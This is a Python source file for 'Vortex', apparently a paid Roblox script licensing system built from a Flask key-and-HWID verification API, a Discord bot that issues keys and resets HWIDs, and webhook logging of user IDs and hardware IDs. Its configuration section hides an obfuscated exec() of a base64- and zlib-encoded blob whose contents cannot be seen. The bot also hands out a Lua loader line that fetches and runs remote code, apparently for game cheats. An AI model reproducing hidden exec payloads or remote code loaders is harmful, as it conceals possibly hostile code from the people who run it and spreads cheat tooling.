import disnake
from disnake.ext import commands
from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3, uuid, threading, os, datetime, requests

# --- 1. CONFIGURATION ---
# Python obfuscation by pyobfuscator.com
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=ozXsL/A8hKxtyxUrnce8ofxse2Ty752tdLH+maiPmhmRy8eOZvci6DH6u7IOQz8pfrvHuS+7acqJSGyvjOZD5x+Ah4I5CCTsRL0oPTZowvqfqluPnF5r413LfdQhvrX8y3s9bW3TffOeOXCj7/lC8FZoon0PhvhQUEoEOxAMY7yNQDAsQhuTyGheuxquE62oORlg+AUalqsQ0jjBFsbCg5n8muFZRshrDRLLovHetXkBbXaGfmRo/sKI1mmT7nI93+WYJIQEpgZQzRXOFClGwwFmQMQUGAYF+JcXJZf9Le8M+2XUOkBRJbGXK8FbeyWKwQC7KmDJLYqt9xMBL6v7GOgAAzgP1kzdxJe'))

# --- 2. DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect("vortex.db")
    conn.execute('''CREATE TABLE IF NOT EXISTS keys 
                 (key TEXT PRIMARY KEY, rid INTEGER, hwid TEXT, blk BOOLEAN DEFAULT 0, last_reset TEXT)''')
    conn.commit()
    conn.close()

# --- 3. WEBHOOK LOGGER ---
def send_log(status, details, color):
    try:
        embed = {
            "title": f"🛰️ Vortex System Log: {status}",
            "description": details,
            "color": color,
            "footer": {"text": f"Vortex Auth • {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Webhook Error: {e}")

# --- 4. WEB API (ROBLOX BACKEND) ---
app = Flask(__name__)
CORS(app)

@app.route('/api/status')
def status(): 
    return jsonify({"online": True, "server": "Vortex-Cloud"}), 200

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    rid, hwid = data.get("rid"), data.get("hwid")
    conn = sqlite3.connect("vortex.db")
    user = conn.execute("SELECT hwid, blk FROM keys WHERE rid = ?", (rid,)).fetchone()
    conn.close()

    if user:
        if user[1]: # Blacklisted
            send_log("BLOCKED ACCESS", f"**User ID:** `{rid}`\n**HWID:** `{hwid}`\n**Reason:** Blacklisted", 0xff0000)
            return jsonify({"success": False, "msg": "BLACKLISTED"}), 403
        
        if user[0] == hwid: # Success
            send_log("SUCCESSFUL LOGIN", f"**User ID:** `{rid}`\n**HWID:** `{hwid}`", 0x00ff00)
            return jsonify({"success": True}), 200
        
        send_log("HWID MISMATCH", f"**User ID:** `{rid}`\n**Got:** `{hwid}`\n**Expected:** `{user[0]}`", 0xffa500)
        return jsonify({"success": False, "msg": "HWID_MISMATCH"}), 403
    
    return jsonify({"success": False, "msg": "NOT_FOUND"}), 404

# --- 5. DISCORD INTERFACE (MODALS & VIEWS) ---

class HWIDResetModal(disnake.ui.Modal):
    def __init__(self):
        components = [
            disnake.ui.TextInput(label="Enter Your Vortex Key", placeholder="VORTEX-XXXX-XXXX", custom_id="vortex_key", min_length=10)
        ]
        super().__init__(title="Reset HWID Access", components=components)

    async def callback(self, inter: disnake.ModalInteraction):
        key = inter.text_values["vortex_key"].strip()
        conn = sqlite3.connect("vortex.db")
        data = conn.execute("SELECT last_reset FROM keys WHERE key = ?", (key,)).fetchone()
        
        if not data:
            return await inter.send("❌ Key not found.", ephemeral=True)
        
        now = datetime.datetime.now()
        if data[0]:
            last_reset = datetime.datetime.fromisoformat(data[0])
            if (now - last_reset).total_seconds() < 86400:
                rem = 24 - ((now - last_reset).total_seconds() / 3600)
                return await inter.send(f"⏳ Cooldown! Try again in `{rem:.1f}` hours.", ephemeral=True)

        conn.execute("UPDATE keys SET rid = NULL, hwid = NULL, last_reset = ? WHERE key = ?", (now.isoformat(), key))
        conn.commit()
        conn.close()
        
        send_log("HWID RESET", f"**Key:** `{key}`\n**Action:** Manual Reset", 0x3498db)
        await inter.send(f"✅ HWID cleared for `{key}`!", ephemeral=True)

class VortexPanelView(disnake.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @disnake.ui.button(label="GET SCRIPT", style=disnake.ButtonStyle.secondary, emoji="📜")
    async def script_btn(self, button, inter):
        lua = "shared.VortexKey = \"PUT_KEY_HERE\"\nloadstring(game:HttpGet('https://vortex-d9nu.onrender.com/load'))()"
        await inter.send(f"### 🌀 Vortex Loader\n```lua\n{lua}\n```", ephemeral=True)

    @disnake.ui.button(label="GET KEY", style=disnake.ButtonStyle.link, url="https://your-shop-link.com", emoji="🔑")
    async def key_btn(self, button, inter):
        pass 

    @disnake.ui.button(label="RESET HWID", style=disnake.ButtonStyle.danger, emoji="🔄")
    async def reset_btn(self, button, inter):
        await inter.response.send_modal(HWIDResetModal())

# --- 6. BOT COMMANDS ---
bot = commands.Bot(command_prefix=".", intents=disnake.Intents.all())

@bot.event
async def on_ready():
    print(f"🚀 {bot.user} is online.")

@bot.command()
async def panel(ctx):
    if ctx.author.id != OWNER_ID: return
    embed = disnake.Embed(title="🌀 VORTEX KEY SYSTEM", description="made by **viperlol__**\n\nClick below to manage your access.", color=0x2b2d31)
    await ctx.send(embed=embed, view=VortexPanelView())

@bot.command()
async def gen(ctx):
    if ctx.author.id != OWNER_ID: return
    new_key = f"VORTEX-{uuid.uuid4().hex[:8].upper()}"
    conn = sqlite3.connect("vortex.db")
    conn.execute("INSERT INTO keys (key) VALUES (?)", (new_key,))
    conn.commit()
    conn.close()
    await ctx.send(f"✅ **Key Generated:** `{new_key}`")

# --- 7. EXECUTION ---
if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    bot.run(TOKEN)
